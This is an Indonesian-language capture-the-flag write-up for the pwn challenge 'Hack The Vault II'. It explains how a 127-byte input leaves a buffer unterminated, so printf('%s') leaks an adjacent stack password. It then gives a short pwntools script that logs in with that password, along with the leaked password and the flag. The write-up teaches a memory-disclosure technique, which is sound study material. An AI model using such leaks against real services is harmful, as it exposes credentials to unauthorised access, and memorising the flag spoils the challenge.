# Hack The Vault II

## Informasi Challenge

| Field | Value |
|-------|-------|
| **Kategori** | Pwn |
| **Judul** | Hack The Vault II |
| **Service** | `nc 34.40.133.67 7778` |

---

# Ringkasan

Challenge ini tidak mengandung buffer overflow klasik karena panjang input dibatasi sesuai ukuran buffer. Namun, fungsi autentikasi memiliki **out-of-bounds string read** akibat penggunaan `printf("%s")` terhadap buffer yang tidak dijamin memiliki terminator `NULL`.

Dengan mengirim **127 byte**, string yang dicetak akan terus membaca memori setelah buffer hingga menemukan byte `NULL`. Karena password disimpan tepat setelah buffer pada stack, isi password ikut tercetak dan dapat digunakan untuk login.

---

# Analisis Source

Potongan kode penting pada fungsi `auth()`:

```c
char array[127 + 64];

char *buffer = &array[0];
char *password = &array[127];
```

Layout stack menjadi:

```text
array
│
├── buffer
│   offset 0 ──────────────── 126
│
└── password
    offset 127 ───────────────
```

Buffer untuk input user dimulai dari offset 0, sedangkan password berada tepat setelahnya pada offset 127.

---

# Analisis Kerentanan

Input dibatasi maksimal:

```text
127 byte
```

Sehingga payload tidak dapat menimpa password maupun return address.

Namun setelah input diterima, program menjalankan:

```c
printf("password you entered: %s\n", buffer);
```

Specifier `%s` menganggap `buffer` adalah sebuah string C yang diakhiri byte `NULL`.

Masalahnya, ketika user mengirim tepat **127 karakter**, seluruh buffer terisi penuh tanpa menyisakan terminator.

Akibatnya `printf()` terus membaca byte setelah buffer hingga menemukan `NULL`.

Ilustrasi memori:

```text
buffer
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
127 byte

langsung diikuti

password
GNk1f:sH)7#uY9$1vpS5c~Z^I#&fe6*a
```

Karena tidak ada byte `NULL` di akhir buffer, `%s` akan mencetak:

```
AAAAAAAAAAAAAAAAAAAAAAAA...

GNk1f:sH)7#uY9$1vpS5c~Z^I#&fe6*a
```

Kerentanan ini merupakan **out-of-bounds read** atau **information disclosure**, bukan buffer overflow.

---

# Leak Password

Payload yang dikirim:

```python
b"A" * 127
```

Output service:

```text
password you entered:

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
GNk1f:sH)7#uY9$1vpS5c~Z^I#&fe6*a
```

Password berhasil bocor:

```text
GNk1f:sH)7#uY9$1vpS5c~Z^I#&fe6*a
```

---

# Final Exploit

Setelah password diketahui, tahap berikutnya hanya perlu mengirim password tersebut ke service.

```python
from pwn import *

HOST = "34.40.133.67"
PORT = 7778

password = b"GNk1f:sH)7#uY9$1vpS5c~Z^I#&fe6*a"

io = remote(HOST, PORT)

io.recvuntil(b"Enter the password: ")

io.sendline(password)

print(io.recvall().decode())
```

---

# Output

```text
I knew I can count on you!
Chasing 'em down, and see you on the flip side.

bushbash{1nto-th3-bUsh-w3-Go}
```

---

# Alur Eksploit

```text
Kirim 127 byte
        │
        ▼
Buffer terisi penuh
        │
        ▼
Tidak ada NULL terminator
        │
        ▼
printf("%s")
membaca melewati buffer
        │
        ▼
Password pada stack ikut tercetak
        │
        ▼
Login menggunakan password asli
        │
        ▼
Flag diperoleh
```

---

# Flag

```text
bushbash{1nto-th3-bUsh-w3-Go}
```
